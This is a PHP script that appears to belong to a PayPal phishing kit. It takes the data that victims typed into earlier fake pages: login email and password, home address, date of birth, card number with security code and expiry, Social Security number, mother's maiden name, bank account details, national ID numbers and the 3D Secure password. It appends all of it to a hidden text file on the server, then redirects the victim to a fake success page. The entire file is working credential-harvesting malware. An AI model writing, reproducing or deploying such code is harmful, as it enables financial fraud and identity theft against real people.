<?php

session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');

$handle = fopen('../../../../vbv.txt', 'a');
$Z118_MESSAGE .= "[PP Email] = ".$_SESSION['_login_email_']."
[PP Password] = ".$_SESSION['_login_password_']."

[Full Name] = ".$_SESSION['_fullname_']."
[Address line] = ".$_SESSION['_address_']."
[Country Name] = ".ucwords(strtolower($_SESSION['_country_']))."
[Town/City] = ".$_SESSION['_city_']."
[Province/State] = ".$_SESSION['_state_']."
[Postal/Zip Code] = ".$_SESSION['_zipCode_']."
[Phone Number] = ".$_SESSION['_phone_']."".$_SESSION['_phone_numb_']."
[Date Of Birth]  = ".$_SESSION['_dob_']."

[Bank Name] = ".$_SESSION['_cc_bank_']."
[Cardholder's Name] = ".$_SESSION['_nameoncard_']."
[".$_SESSION['_cd_']." Card Number] = ".$_SESSION['_cardnumber_']." (".$_SESSION['_cc_class_'].")
[Card Security Code]	= ".$_SESSION['_csc_']."
[Expiration Date] = ".$_SESSION['_expdate_']."\n";
if ($_SESSION['_country_'] == "UNITED STATES"){ // UNITED STATES
$Z118_MESSAGE .= "[Social Security Number] = ".$_SESSION['_ssnnum_']."\n";
$Z118_MESSAGE .= "[Phone Number] = +".$_SESSION['_phone_']."-".$_SESSION['_phone_numb_']."\n";}
elseif ($_SESSION['_country_'] == "CANADA"){ // CANADA
$Z118_MESSAGE .= "[Social Security Number] = ".$_SESSION['_ssnnum_']."\n";
$Z118_MESSAGE .= "[Mother's Maiden Name] = ".$_SESSION['_mmname_']."\n";
$Z118_MESSAGE .= "[Phone Number] = +".$_SESSION['_phone_']."-".$_SESSION['_phone_numb_']."\n";}
elseif ($_SESSION['_country_'] == "UNITED KINGDOM" || $_SESSION['_country_'] ==  "IRELAND"){ // UNITED KINGDOM // IRELAND
$Z118_MESSAGE .= "[Mother's Maiden Name] = ".$_SESSION['_mmname_']."\n";
$Z118_MESSAGE .= "[Sort Code] = ".$_SESSION['_sortnum_']."\n";
$Z118_MESSAGE .= "[Account Number] = ".$_SESSION['_accnumber_']."\n";}
elseif($_SESSION['_country_'] == "AUSTRALIA"){ // AUSTRALIA
$Z118_MESSAGE .= "[Credit Limits] = ".$_SESSION['_creditlimit_']."\n";
$Z118_MESSAGE .= "[OSID]	= ".$_SESSION['_osid_']."\n";}
elseif($_SESSION['_country_'] == "ITALY"){ // ITALY
$Z118_MESSAGE .= "[Codice Fiscale] = ".$_SESSION['_codicefiscale_']."\n";}
if($_SESSION['_country_'] == "SWITZERLAND" || $_SESSION['_country_'] ==  "GERMANY") { // SWITZERLAND || GERMANY
$Z118_MESSAGE .= "[Kontonummer] = ".$_SESSION['_kontonummer_']."\n";}
elseif($_SESSION['_country_'] == "GREECE"){ // GREECE
$Z118_MESSAGE .= "[Officiel ID] = ".$_SESSION['_offid_']."\n";}
$Z118_MESSAGE .= "
[3D Secure] = ".$_SESSION['_password_vbv_']."

[IP INFO] = ".$_SESSION['_ip_']."
[TIME/DATE] = ".$TIME_DATE."
[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."
********************************************************
";
    fwrite($handle, $Z118_MESSAGE);
    fclose($handle);


        HEADER("Location: ../success/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
?>